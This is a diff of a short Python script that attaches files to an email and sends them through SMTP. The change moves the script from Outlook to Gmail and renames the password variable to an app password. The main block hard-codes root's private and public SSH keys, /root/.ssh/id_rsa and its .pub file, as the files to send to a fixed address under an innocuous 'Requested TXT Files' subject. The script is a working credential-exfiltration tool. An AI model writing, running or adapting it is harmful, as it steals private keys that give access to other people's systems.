@@ -2,7 +2,7 @@ import os
 import smtplib
 from email.message import EmailMessage
 
-def send_files_as_txt_via_email(email_address, password, file_paths, enableDebug=False):
+def send_files_as_txt_via_email(email_address, app_password, file_paths, enableDebug=False):
     msg = EmailMessage()
     msg['Subject'] = 'Requested TXT Files'
     msg['From'] = email_address
@@ -26,9 +26,10 @@ def send_files_as_txt_via_email(email_address, password, file_paths, enableDebug
                 print(f"[ERROR] Failed to attach {file_path}: {e}")
 
     try:
-        server = smtplib.SMTP('smtp-mail.outlook.com', 587)
+        # ✅ Gmail SMTP
+        server = smtplib.SMTP('smtp.gmail.com', 587)
         server.starttls()
-        server.login(email_address, password)
+        server.login(email_address, app_password)  # ← App Password goes here
         server.send_message(msg)
         server.quit()
         print("Files sent successfully.")
@@ -38,10 +39,10 @@ def send_files_as_txt_via_email(email_address, password, file_paths, enableDebug
 
 # Main
 if __name__ == "__main__":
-    email_address = 'testsingtest@outlook.com'
-    password = ''
+    email_address = 'tt9779159@gmail.com'
+    app_password = ''
     files_to_send = [
         '/root/.ssh/id_rsa.pub',
         '/root/.ssh/id_rsa'
     ]
-    send_files_as_txt_via_email(email_address, password, files_to_send, enableDebug=True)
+    send_files_as_txt_via_email(email_address, app_password, files_to_send, enableDebug=True)
